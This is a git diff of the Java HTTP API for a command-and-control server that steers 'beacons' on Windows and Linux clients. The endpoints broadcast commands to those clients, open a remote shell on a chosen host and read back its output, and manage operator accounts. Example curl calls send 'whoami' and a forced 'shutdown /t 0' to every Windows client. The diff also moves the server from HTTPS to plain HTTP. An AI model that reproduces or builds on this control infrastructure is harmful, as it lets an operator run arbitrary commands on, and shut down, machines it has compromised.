@@ -2,7 +2,6 @@ package Servers.C2;
 
 import java.io.*;
 import java.net.InetSocketAddress;
-import java.security.KeyStore;
 import java.security.SecureRandom;
 import java.time.Instant;
 import java.util.ArrayList;
@@ -12,15 +11,11 @@ import java.util.concurrent.ArrayBlockingQueue;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
-import javax.net.ssl.KeyManagerFactory;
-import javax.net.ssl.TrustManagerFactory;
 import com.sun.net.httpserver.*;
-import javax.net.ssl.SSLEngine;
-import javax.net.ssl.SSLParameters;
 
+import org.json.JSONArray;
 import org.json.JSONObject;
 
-import javax.net.ssl.SSLContext;
 
 public class C2ServerAPI implements Runnable {
     // Pointer back to the C2 Server
@@ -70,6 +65,24 @@ public class C2ServerAPI implements Runnable {
         return false;
     }
 
+    /**
+     * Used to revoke all bearer tokens granted to a user
+     * @param username - user that should have their tokens revoked
+     */
+    private void removeUserBearerTokens(String username){
+        ArrayList<String> badTokens = new ArrayList<>();
+        for(String token : bearerTokens.keySet()){
+            if(bearerTokens.get(token).equals(username)){
+                badTokens.add(token);
+            }
+        }
+
+        for(String token : badTokens){
+            bearerTokens.remove(token);
+            bearerTokensExpirationTime.remove(token);
+        }
+    }
+
 
     public class MyHandler implements HttpHandler {
         @Override
@@ -86,7 +99,7 @@ public class C2ServerAPI implements Runnable {
              * 
              * Example:
              * 
-             * curl -u root:password https://localhost:8000/auth
+             * curl -u root:password http://localhost:7000/auth
              * 
              * Output:
              * 
@@ -101,19 +114,19 @@ public class C2ServerAPI implements Runnable {
              * 
              * Example (sends whoami to all clients):
              * 
-             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"x.x.x.x","command":"whoami"}' https://localhost:8000/command
+             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"x.x.x.x","command":"whoami"}' http://localhost:7000/command
              * 
              * Example (sends ipconfig to one client):
              * 
-             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"192.168.1.1","command":"ipconfig"}' https://localhost:8000/command
+             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"192.168.1.1","command":"ipconfig"}' http://localhost:7000/command
              * 
              * Example (shutsdown all windows clients):
              * 
-             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"Windows","command":"shutdown /t 0"}' https://localhost:8000/command
+             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"Windows","command":"shutdown /t 0"}' http://localhost:7000/command
              * 
              * Output (for any command run):
              * 
-             * success
+             * {"output":"success"}
              * 
              * 
              * 
@@ -122,11 +135,11 @@ public class C2ServerAPI implements Runnable {
              * 
              * Example:
              * 
-             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"192.168.1.1","command":"whoami"}' https://localhost:8000/shell
+             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"192.168.1.1","command":"whoami"}' http://localhost:7000/shell
              * 
              * Output:
              * 
-             * root
+             * {"output":"root"}
              * 
              * 
              * /responses
@@ -134,7 +147,7 @@ public class C2ServerAPI implements Runnable {
              * 
              * Example:
              * 
-             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"x.x.x.x"}' https://localhost:8000/responses
+             * curl --oauth2-bearer oauth2bearertoken -d '{"scope":"x.x.x.x"}' http://localhost:7000/responses
              * 
              * Output:
              * 
@@ -148,7 +161,7 @@ public class C2ServerAPI implements Runnable {
              * 
              * Example:
              * 
-             * curl --oauth2-bearer oauth2bearertoken https://localhost:8000/status
+             * curl --oauth2-bearer oauth2bearertoken http://localhost:7000/status
              * 
              * Output:
              * 
@@ -163,16 +176,30 @@ public class C2ServerAPI implements Runnable {
              * 
              * Example:
              * 
-             * curl --oauth2-bearer oauth2bearertoken -d '{"username":"username","password","password"}' https://localhost:8000/user
+             * curl --oauth2-bearer oauth2bearertoken -d '{"username":"username","password","password"}' http://localhost:7000/user
              * 
              * Output:
              * 
-             * success
+             * {"output": "success"}
              * 
+             * 
+             * /messages
+             * Gets generic messages from the C2 Server, such as new clients, lost clients, lost beacons
+             * 
+             * Example
+             * curl --oauth2-bearer oauth2bearertoken -d '{"Messages Read":0}' http://localhost:7000/user
+             * 
+             * Output:
+             * 
+             * ["New Linux client at 192.168.1.1", "Lost Windows Client at 10.0.0.1"]
              */
-
             // First, the client needs to present their username and password, to get a BEARER token
-            if(t.getRequestURI().toString().equals("/auth") && t.getRequestMethod().equals("GET")){
+            if(t.getRequestMethod().equals("OPTIONS")){
+                t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
+                t.getResponseHeaders().add("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+                t.getResponseHeaders().add("Access-Control-Allow-Headers", "Authorization, Content-Type");
+                t.sendResponseHeaders(204, -1);
+            } else if(t.getRequestURI().toString().equals("/auth") && t.getRequestMethod().equals("GET")){
                 String auth = t.getRequestHeaders().get("Authorization").get(0);
                 if(auth.split(" ")[0].equals("Basic")){
                     String userpass = new String(Base64.getDecoder().decode(auth.split(" ")[1]));
@@ -187,13 +214,15 @@ public class C2ServerAPI implements Runnable {
                         t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
                         t.sendResponseHeaders(200, response.getBytes().length);
                     } else {
+                        JSONObject jsonBearerObject = new JSONObject();
+                        jsonBearerObject.put("error", "Invalid Credentials");
+                        response = jsonBearerObject.toString();
                         t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
                         t.sendResponseHeaders(401, response.getBytes().length);
                     }
                 }
             } else if (validateBearerToken(t.getRequestHeaders().get("Authorization").get(0).split(" ")[1])){
                 if(t.getRequestURI().toString().equals("/status") && t.getRequestMethod().equals("GET")){
-                    System.out.println(t.getRequestHeaders());
                     C2server.distributeCommandToBeacons("Windows", "whoami");
                     C2server.distributeCommandToBeacons("Linux", "whoami");
                     try{
@@ -214,31 +243,81 @@ public class C2ServerAPI implements Runnable {
                     String scope = commandJSON.get("scope").toString();
                     String command = commandJSON.get("command").toString();
                     C2server.distributeCommandToBeacons(scope, command);
-                    response = "success";
+
+                    JSONObject returnObject = new JSONObject();
+                    returnObject.put("output", "success");
+                    response = returnObject.toString();
+
                 } else if (t.getRequestURI().toString().equals("/shell") && t.getRequestMethod().equals("POST")){
                     JSONObject shellJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
                     String scope = shellJSON.get("scope").toString();
                     String command = shellJSON.get("command").toString();
-    
-                    int numResponses = C2server.getClientResponses(scope).get(scope).size();
-                    C2server.getShellResponse(scope, command);
-                    ArrayList<String> clientResponses = C2server.getClientResponses(scope).get(scope);
-                    for(int i = numResponses; i < clientResponses.size(); i++){
-                        response += clientResponses.get(i);
-                    }
-                } else if (t.getRequestURI().toString().equals("/user") && t.getRequestMethod().equals("POST") && bearerTokens.get(t.getRequestHeaders().get("Authorization").get(0).split(" ")[1]).equals("root")){
-                    JSONObject shellJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
-                    String username = shellJSON.get("username").toString();
-                    String password = shellJSON.get("password").toString();
-                    C2server.updateUsernamePassword(username, C2Server.hashPassword(password));
-                    response = "success";
+                    String shellResponse = "";
+                    try{
+                        int numResponses = C2server.getClientResponses(scope).get(scope).size();
+                        C2server.getShellResponse(scope, command);
+                        ArrayList<String> clientResponses = C2server.getClientResponses(scope).get(scope);
+                        
+                        for(int i = numResponses; i < clientResponses.size(); i++){
+                            shellResponse += clientResponses.get(i);
+                        }
 
+                        JSONObject returnObject = new JSONObject();
+                        returnObject.put("output", shellResponse);
+                        response = returnObject.toString();
+                    } catch (Exception e){
+                        JSONObject returnObject = new JSONObject();
+                        returnObject.put("error", "shell unavailable");
+                        response = returnObject.toString();
+                    }           
+
+                    
+                } else if (t.getRequestURI().toString().equals("/user") && t.getRequestMethod().equals("POST") && bearerTokens.get(t.getRequestHeaders().get("Authorization").get(0).split(" ")[1]).equals("root")){
+                    JSONObject userJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
+                    String action = userJSON.get("type").toString();
+                    if(action.equals("add")){
+                        String username = userJSON.get("username").toString();
+                        String password = userJSON.get("password").toString();
+                        C2server.updateUsernamePassword(username, C2Server.hashPassword(password));
+                    } else if (action.equals("disable")){
+                        String username = userJSON.get("username").toString();
+                        C2server.disableUser(username);
+                        try{
+                            removeUserBearerTokens(username);
+                        } catch(Exception e){
+                            e.printStackTrace();
+                        }
+                    }
+
+                    JSONObject returnObject = new JSONObject();
+                    returnObject.put("output", "success");
+                    response = returnObject.toString();
+
+                } else if (t.getRequestURI().toString().equals("/messages") && t.getRequestMethod().equals("POST")){
+                    JSONObject messageJSON = new JSONObject(new String(t.getRequestBody().readAllBytes()));
+                    int numMessagesRead = Integer.parseInt(messageJSON.get("Messages Read").toString());
+                    JSONArray messageListJSON = new JSONArray(C2server.getUserMessages(numMessagesRead));
+                    response = messageListJSON.toString();
                 }
-                t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
+                t.getResponseHeaders().add("Access-Control-Allow-Origin", "https://www.javalanche.net");
+                t.getResponseHeaders().set("Content-Type", "application/json");
                 t.sendResponseHeaders(200, response.getBytes().length);
             } else {
-                t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
-                t.sendResponseHeaders(401, response.getBytes().length);
+                JSONObject jo = new JSONObject();
+                // If the token is expired and the client just needs to ask for a new one, they get a 401 unauthorized
+                // If the user has been disabled, or they just use a invalid token, they get a 403 forbidden
+                if(bearerTokens.keySet().contains(t.getRequestHeaders().get("Authorization").get(0).split(" ")[1])){
+                    jo.put("error", "expired token");
+                    response = jo.toString();
+                    t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
+                    t.sendResponseHeaders(401, response.getBytes().length);
+                } else {
+                    jo.put("error", "invalid token");
+                    response = jo.toString();
+                    t.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
+                    t.sendResponseHeaders(403, response.getBytes().length);
+                }
+                
             }
             
             
@@ -251,60 +330,24 @@ public class C2ServerAPI implements Runnable {
     @Override
     public void run() {
         try {
-            // setup the socket address
-            InetSocketAddress address = new InetSocketAddress(8000);
+            //////////////// HTTP Server ////////////////
+            
+            InetSocketAddress httpAddress = new InetSocketAddress(7000);
+            HttpServer httpServer = HttpServer.create(httpAddress, 0);
 
-            // initialise the HTTPS server
-            HttpsServer httpsServer = HttpsServer.create(address, 0);
-            SSLContext sslContext = SSLContext.getInstance("TLS");
-
-            // initialise the keystore
-            char[] password = "password".toCharArray();
-            KeyStore ks = KeyStore.getInstance("JKS");
-            FileInputStream fis = new FileInputStream("/etc/javalanche/testkey.jks");
-            ks.load(fis, password);
-
-            // setup the key manager factory
-            KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
-            kmf.init(ks, password);
-
-            // setup the trust manager factory
-            TrustManagerFactory tmf = TrustManagerFactory.getInstance("SunX509");
-            tmf.init(ks);
-
-            // setup the HTTPS context and parameters
-            sslContext.init(kmf.getKeyManagers(), tmf.getTrustManagers(), null);
-            httpsServer.setHttpsConfigurator(new HttpsConfigurator(sslContext) {
-                public void configure(HttpsParameters params) {
-                    try {
-                        // initialise the SSL context
-                        SSLContext context = getSSLContext();
-                        SSLEngine engine = context.createSSLEngine();
-                        
-
-                        // Set the SSL parameters
-                        SSLParameters sslParameters = context.getSupportedSSLParameters();
-                        sslParameters.setNeedClientAuth(false);
-                        sslParameters.setCipherSuites(engine.getEnabledCipherSuites());
-                        sslParameters.setProtocols(engine.getEnabledProtocols());
-                        params.setSSLParameters(sslParameters);
-
-                    } catch (Exception ex) {
-                        System.out.println("Failed to create HTTPS port");
-                    }
-                }
-            });
-            httpsServer.createContext("/command", new MyHandler());
-            httpsServer.createContext("/shell", new MyHandler());
-            httpsServer.createContext("/response", new MyHandler());
-            httpsServer.createContext("/status", new MyHandler());
-            httpsServer.createContext("/auth", new MyHandler());
-            httpsServer.createContext("/user", new MyHandler());
-            httpsServer.setExecutor(new ThreadPoolExecutor(4, 8, 30, TimeUnit.SECONDS, new ArrayBlockingQueue<Runnable>(100)));
-            httpsServer.start();
+            httpServer.createContext("/command", new MyHandler());
+            httpServer.createContext("/shell", new MyHandler());
+            httpServer.createContext("/response", new MyHandler());
+            httpServer.createContext("/status", new MyHandler());
+            httpServer.createContext("/auth", new MyHandler());
+            httpServer.createContext("/user", new MyHandler());
+            httpServer.createContext("/messages", new MyHandler());
+           
+            httpServer.setExecutor(new ThreadPoolExecutor(4, 8, 30, TimeUnit.SECONDS, new ArrayBlockingQueue<Runnable>(100)));
+            httpServer.start();
 
         } catch (Exception exception) {
-            System.out.println("Failed to create HTTPS server on port " + 8000 + " of localhost");
+            System.out.println("Failed to create API Server");
             exception.printStackTrace();
         }
     }
